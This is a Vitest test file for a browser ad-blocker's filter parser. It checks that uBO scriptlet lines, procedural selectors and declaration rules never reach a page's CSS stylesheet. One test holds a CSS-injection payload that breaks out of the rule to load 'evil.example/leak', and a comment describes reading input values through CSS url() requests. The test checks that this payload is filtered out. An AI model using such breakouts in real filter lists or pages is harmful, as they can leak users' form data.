import { describe, expect, it } from 'vitest'
import { parseFilterList } from '@shared/filters/parse.js'
import { buildCosmeticIndex, cosmeticCss, cosmeticSelectorsFor } from '@shared/filters/cosmetic.js'
import { accountedLines } from '@shared/filters/model.js'

/**
 * What happens to a cosmetic line this engine cannot honour, and what it must not cost.
 *
 * ## The defect
 *
 * uBlock Origin's own syntax puts three quite different things behind the same `##` separator:
 *
 *   - plain hiding — `example.com##.ad-slot`, which is a CSS selector
 *   - **scriptlet injection** — `example.com##+js(set-constant, adsShown, true)`, which is not a
 *     selector at all but a named script to run in the page
 *   - **procedural selectors** — `example.com##.box:has-text(Anzeige)`, which is a selector plus an
 *     operator no CSS engine implements
 *
 * `parseCosmeticRule` accepted all three, because it only checks the *separator*: `#?#` and `#$#` are
 * recognised and rejected, and `##` is taken to mean "the rest is a selector". So `+js(…)` and
 * `:has-text(…)` were stored as selectors and written into the page's stylesheet.
 *
 * And `cosmeticCss` joins a batch of selectors into **one** CSS rule. A CSS selector list is
 * all-or-nothing: one member the parser cannot read invalidates the entire rule. So a single scriptlet
 * line matching the current host silently switched off *every* host-specific hiding rule for that
 * page — the rules were computed, sent, injected, and dropped by the CSS parser on arrival.
 *
 * The default filter lists include `annoyances-others.txt` from uAssets, which is written in uBO
 * syntax and full of both forms. This was not a corner case; it was most sites.
 *
 * ## The two layers, and why both
 *
 * **Named rejection at the parser.** A line that cannot be honoured is counted with a reason instead
 * of stored, which is the rule the whole of `parse.ts` is built on: under-blocking has to be a number
 * somebody can read rather than an absence nobody notices. This is the layer that makes the cost
 * *visible*.
 *
 * **The same check again in `cosmeticCss`.** Not redundancy: the parser is not the only route into a
 * page's stylesheet — user rules, a picked element, and whatever the next list format turns out to be
 * all arrive by other ways. The guarantee wanted is about what enters a page, so it is enforced where
 * that happens.
 *
 * ## What it costs, measured against the lists this browser actually ships
 *
 * The check is an allowlist, so being too strict is the risk. Run over the three default lists
 * (EasyList, EasyPrivacy, uAssets annoyances-others, fetched 31.07.2026):
 *
 * | | kept | scriptlet | procedural | declaration | unknown |
 * |---|---|---|---|---|---|
 * | EasyList | 23 798 | 0 | 6 | 29 | 7 |
 * | EasyPrivacy | 2 | 27 | 5 | 0 | 0 |
 * | annoyances-others | 459 | 2 085 | 706 | 0 | 0 |
 *
 * Seven lines in EasyList that nothing can classify, out of 23 840 — three hundredths of a percent, and
 * every one of them was previously being written into a page as CSS. The 2 112 scriptlet lines are the
 * answer to "what is missing from the JS ad blocking": they are a feature this browser does not have
 * yet, and they are now counted instead of being injected as broken selectors.
 */

describe('a scriptlet line is not a selector', () => {
  /**
   * These three used to assert that a scriptlet line was *rejected*, and that was the right assertion for
   * as long as this browser could not run one: refused and counted beats written into a stylesheet.
   *
   * It runs them now (`scriptlets.ts`), so the claim moved rather than weakened. What still has to be
   * true — and is the whole point of this file — is that the line does not become a **selector**. Where
   * it goes instead is `filter-scriptlets.test.ts`'s subject.
   */
  it('becomes a scriptlet rule rather than a selector', () => {
    const parsed = parseFilterList('example.com##+js(set-constant, adsShown, true)')
    expect(parsed.cosmetic).toEqual([])
    expect(parsed.scriptlet).toHaveLength(1)
    expect(parsed.diagnostics.unsupported).toBe(0)
    expect(parsed.diagnostics.scriptlet).toBe(1)
  })

  it('is still refused, and named, when this browser has no implementation for it', () => {
    /*
      The honest half. `nowebrtc` is a real uBO scriptlet and is not in the library — the library was
      chosen from usage counts, and this one appears twice in the three default lists. So the line is
      counted with the *name* in the reason, which is what turned a number into the list of eight
      implementations that were worth writing.
    */
    const parsed = parseFilterList('##+js(nowebrtc)')
    expect(parsed.cosmetic).toEqual([])
    expect(parsed.scriptlet).toEqual([])
    expect(parsed.diagnostics.unsupportedByReason).toHaveProperty('scriptlet-unimplemented:nowebrtc')
  })

  it('keeps the line accounting exact, which is how the counters stay trustworthy', () => {
    // Six counters now rather than five: a scriptlet line is neither cosmetic nor unsupported, so
    // `accountedLines` had to grow with it or this invariant would have started failing for real lists.
    const parsed = parseFilterList(
      [
        'example.com##.ad',
        'example.com##+js(set-constant, x, true)',
        'example.com##+js(nowebrtc)',
        '! a comment',
        ''
      ].join('\n')
    )
    expect(accountedLines(parsed.diagnostics)).toBe(parsed.diagnostics.lines)
  })
})

describe('a procedural selector is not a CSS selector', () => {
  /**
   * These asserted that every procedural operator was *refused*, which was right for as long as this
   * browser could not evaluate one: counted beats written into a stylesheet, where it invalidates the rule
   * it was joined into.
   *
   * There is an engine now (`procedural.ts`, `procedural-match.ts`), so the claim moved rather than
   * weakened. What still has to hold — and is what this file is about — is that such a selector never
   * reaches **CSS**. Where it goes instead is `filter-procedural.test.ts`'s subject.
   */
  const honoured = [
    'example.com##.box:has-text(Anzeige)',
    'example.com##.item:upward(2)',
    'example.com##div:matches-css(position: fixed)',
    'example.com##.a:min-text-length(20)',
    'example.com##.e:remove()',
    'example.com##.f:style(height: 0)'
  ]

  it('becomes a procedural rule rather than a selector', () => {
    for (const line of honoured) {
      const parsed = parseFilterList(line)
      expect(parsed.cosmetic, line).toEqual([])
      expect(parsed.procedural, line).toHaveLength(1)
      expect(parsed.diagnostics.unsupported, line).toBe(0)
    }
  })

  it('is still refused, by name, for an operator this browser has no engine for', () => {
    /*
      The honest half, and the reason the subset was chosen by counting rather than by taste: each of these
      appears once or six times across the three default lists, against 537 for `:style()` and 101 for
      `:has-text()`. Refused with the operator in the key, so the next one worth building is a number
      somebody can read.
    */
    const refused: Array<[string, string]> = [
      ['example.com##.b:watch-attr(class)', 'procedural-unimplemented:watch-attr'],
      ['example.com##.c:xpath(//div)', 'procedural-unimplemented:xpath'],
      ['example.com##.d:matches-path(/shop)', 'procedural-unimplemented:matches-path']
    ]
    for (const [line, reason] of refused) {
      const parsed = parseFilterList(line)
      expect(parsed.cosmetic, line).toEqual([])
      expect(parsed.procedural, line).toEqual([])
      expect(Object.keys(parsed.diagnostics.unsupportedByReason), line).toContain(reason)
    }
  })

  it('refuses a procedural operator nested inside a CSS one', () => {
    /*
      `:has(:has-text(x))` is uBO's *procedural* `:has`, which evaluates its argument as a chain. The
      top-level operator here is `:has`, which is ordinary CSS — so this is not a procedural rule by the
      shape this engine accepts, and it must not become a CSS selector either, because `:has-text` inside
      the argument is still not something a CSS parser can read.

      Refused by the selector check, which sees the nested operator wherever it sits. That is the belt to
      the procedural parser's braces: the two look at the same string from opposite ends.
    */
    const parsed = parseFilterList('example.com##.g:has(:has-text(Werbung))')
    expect(parsed.cosmetic).toEqual([])
    expect(parsed.procedural).toEqual([])
    expect(Object.keys(parsed.diagnostics.unsupportedByReason)).toContain('procedural-cosmetic')
  })

  it('still accepts the standard CSS pseudo-classes the lists really use', () => {
    /*
      The direction this must not fail in. `:not()`, `:has()` and the `nth-` family are ordinary CSS and
      EasyList is full of them — 605 uses of `:has()` alone. They must stay on the *declarative* path: it is
      a line in a stylesheet the browser matches, against script re-run on every mutation burst.
    */
    const supported = [
      'example.com##.ad:not(.keep)',
      'example.com##div:has(> .sponsor)',
      'example.com##li:nth-child(2n)',
      'example.com##.a:is(.b, .c)',
      'example.com##.a:where(.b)',
      'example.com##p:first-child',
      'example.com##[data-ad="1"]',
      'example.com##.a > .b + .c ~ .d',
      'example.com##.promo::before'
    ]
    for (const line of supported) {
      const parsed = parseFilterList(line)
      expect(parsed.cosmetic, line).toHaveLength(1)
      expect(parsed.procedural, line).toEqual([])
      expect(parsed.diagnostics.unsupported, line).toBe(0)
    }
  })
})

describe('a rule that restyles instead of hiding', () => {
  /**
   * `metoffice.gov.uk##.header {top:0;}` — EasyList really writes these, with a plain `##`.
   *
   * The worst of the accepted-and-injected cases, and worth its own reason for that. Written into
   * `<selectors> { display: none !important; }` it does not merely fail to work: a CSS parser reads
   * `.header {top:0;}` as a *complete rule*, applies `top: 0` to `.header`, then throws away the
   * browser's own declaration and every selector that followed this one in the batch. So one line turned
   * part of a hiding batch into a restyling of the page, and hid nothing after it.
   */
  it('is refused and named for what it is', () => {
    const parsed = parseFilterList('metoffice.gov.uk##.header {top:0;}')
    expect(parsed.cosmetic).toEqual([])
    expect(parsed.diagnostics.unsupportedByReason).toHaveProperty('cosmetic-declaration')
  })

  it('is not confused with a procedural operator that carries a declaration', () => {
    /*
      `:style(…)` also asks for a restyling, and it is now *honoured* — by the procedural engine, where a
      declaration applied to matched elements is exactly what it means. It never was a
      `cosmetic-declaration`: the brace is the thing that distinguishes them, and `:style()` has none.

      This is the 537-use operator in the three default lists, so getting it onto the working path rather
      than into a counter is most of what the procedural engine buys.
    */
    const parsed = parseFilterList('lyrics.example##.lyricBody:style(user-select: text !important;)')
    expect(parsed.cosmetic).toEqual([])
    expect(parsed.procedural).toHaveLength(1)
    expect(parsed.procedural[0]?.selector.action).toEqual({
      kind: 'style',
      declarations: 'user-select: text !important;'
    })
    expect(parsed.diagnostics.unsupportedByReason).not.toHaveProperty('cosmetic-declaration')
  })
})

describe('one unreadable selector costs itself and not the batch', () => {
  /**
   * The last gate, and why it is asserted on the string rather than on a rendered page.
   *
   * The thing being protected is a *browser's* CSS parser dropping a rule whose selector list has one
   * unreadable member. No test environment here has one: the unit project runs in Node, and happy-dom's
   * CSS support is an approximation — asking it whether a selector list is valid would be asking the
   * wrong authority, and a test that passes because a stub is lenient is worse than no test.
   *
   * So what is asserted is the mechanism: the bad selector is not in the output, and the good ones are.
   * That the CSS parser would have dropped the whole rule had it been there is a fact about CSS, not
   * something this suite can or should re-derive. The end-to-end confirmation belongs in QA, in front of
   * a real page.
   */
  it('leaves an unreadable selector out and keeps the rest of the batch', () => {
    const css = cosmeticCss(['.good-one', '.bad:has-text(x)', '.good-two'])
    expect(css).not.toBeNull()
    expect(css).toContain('.good-one')
    expect(css).toContain('.good-two')
    expect(css, 'a procedural selector reached the stylesheet').not.toContain(':has-text')
  })

  it('leaves out a selector that could break out of the rule it is written into', () => {
    /*
      The other half of this gate, and the one that is not about blocking at all.

      A selector goes into the stylesheet verbatim, and the text comes from a file downloaded over the
      network. `}` closes the rule, so everything after it is stylesheet of the list author's choosing —
      and CSS can read a page: an attribute selector plus `background: url(…)` is a documented way to
      send the contents of an input field somewhere. No list ships that. That is a statement about other
      people's files, which is why it is refused here rather than trusted.
    */
    const css = cosmeticCss(['.ad', '.x} body { background: url(http://evil.example/leak) } .y'])
    expect(css).toContain('.ad')
    expect(css).not.toContain('evil.example')
    // One rule, still: the declaration appears exactly once, so nothing was appended after it.
    expect((css ?? '').match(/\{/g)).toHaveLength(1)
  })

  it('hides what it is asked to hide', () => {
    // `display: none !important`, because the point is to beat the page's own rule and to take the
    // space with it rather than leaving a 250-pixel gap.
    const css = cosmeticCss(['.ad-slot']) ?? ''
    expect(css).toContain('display: none !important')
    expect(css).toContain('.ad-slot')
  })

  it('answers null for nothing to hide, and for nothing usable to hide', () => {
    expect(cosmeticCss([])).toBeNull()
    // Not an empty rule: `{ display: none !important; }` with no selector is itself invalid CSS, so a
    // batch that filters down to nothing has to become nothing.
    expect(cosmeticCss(['+js(nowebrtc)'])).toBeNull()
  })

  it('agrees with the parser about what is safe', () => {
    /*
      The two layers have to hold the same opinion, or the second one silently discards rules the first
      one accepted — under-blocking with no diagnostic anywhere, which is exactly the failure mode this
      whole file is about. Asserted by running list text through both.
    */
    const lines = [
      'a.example##.plain',
      'a.example##.ad:not(.keep)',
      'a.example##div:has(> .sponsor)',
      'a.example##li:nth-child(2n)',
      'a.example##[data-ad="1"]',
      'a.example##.promo::before',
      'a.example##.md\\:flex',
      'a.example##[title=":hover"]'
    ]
    const parsed = parseFilterList(lines.join('\n'))
    expect(parsed.cosmetic, 'the parser refused a selector this test calls safe').toHaveLength(
      lines.length
    )

    const selectors = parsed.cosmetic.map((rule) => rule.selector)
    const css = cosmeticCss(selectors) ?? ''
    for (const selector of selectors) {
      expect(css, `${selector} was accepted by the parser and dropped by cosmeticCss`).toContain(
        selector
      )
    }
  })
})

describe('end to end, from list text to page stylesheet', () => {
  it('keeps a site\'s hiding rules working next to a scriptlet line for the same site', () => {
    /*
      The reported shape of the bug, as a list a real site would be filtered by: two hiding rules and
      one scriptlet, all scoped to the same host. Before the fix the scriptlet was stored as a selector,
      joined into the same CSS rule as the other two, and took both down with it — so the adverts the
      two rules name stayed visible and nothing anywhere said why.
    */
    const parsed = parseFilterList(
      [
        'shop.example##.banner-ad',
        'shop.example##+js(set-constant, canRunAds, true)',
        'shop.example##.sponsored-row'
      ].join('\n')
    )

    const index = buildCosmeticIndex(parsed.cosmetic)
    const { specific } = cosmeticSelectorsFor(index, 'shop.example')
    expect(specific).toEqual(['.banner-ad', '.sponsored-row'])

    // One rule, both selectors, nothing in it a CSS parser would refuse to read.
    const css = cosmeticCss(specific) ?? ''
    expect(css).toBe('.banner-ad,\n.sponsored-row { display: none !important; }')

    // And the scriptlet went where it belongs rather than into the stylesheet or into a counter.
    expect(parsed.diagnostics.scriptlet).toBe(1)
    expect(parsed.scriptlet[0]?.call).toEqual({ name: 'set-constant', args: ['canRunAds', 'true'] })
  })
})
